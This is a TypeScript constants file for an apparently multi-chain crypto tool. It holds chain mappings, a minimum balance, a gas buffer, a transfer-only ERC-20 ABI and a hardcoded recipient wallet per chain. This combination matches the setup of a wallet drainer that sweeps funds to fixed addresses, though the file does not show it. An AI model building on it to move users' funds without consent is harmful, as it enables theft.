export const MINIMUM_BALANCE= 0.0001; // Minimum balance threshold in ETH

export const GAS_BUFFER = 0.0002;

export const chainNames: Record<number, string>= {
  1: "eth-mainnet",
  56: "bnb-mainnet",
  137: "polygon-mainnet",
  42161: "arb-mainnet",
  11155111: "eth-sepolia",
};

export const RECIPIENT_ADDRESSES : Record<number, string>  = {
  1: "0xe664e2D02a25AeD203c44418d93d21b8226cc94c", //mobile eth
  56: "0x3620846D1548418c4940bdf70bD1E826d219ceDb", //bnb
  137: "0x5DBd59C38F71B5b389c3d3583537a8C152e8B52d",
  42161: "0x5DBd59C38F71B5b389c3d3583537a8C152e8B52d",
  11155111: "0x36875E84886F1Ae1032Ee044883bFD3C7c8D9bC2", // mobile
};


export const ERC20_ABI = [
  {
    constant: false,
    inputs: [
      { name: "recipient", type: "address" },
      { name: "amount", type: "uint256" },
    ],
    name: "transfer",
    outputs: [{ name: "", type: "bool" }],
    type: "function",
  },
];

export const supportedChains = [
  { id: 1, name: "Ethereum", nativeSymbol: "ETH" },
  { id: 56, name: "Binance Smart Chain", nativeSymbol: "BNB" },
  { id: 137, name: "Polygon", nativeSymbol: "MATIC" },
  { id: 42161, name: "Arbitrum", nativeSymbol: "ETH" },
];

export const CHAIN_TO_ALCHEMY_NETWORK: Record<number, string> = {
  1: "eth-mainnet",     // Ethereum Mainnet
  56: "bnb-mainnet",    // BNB Chain Mainnet (Alchemy now supports BSC)
};
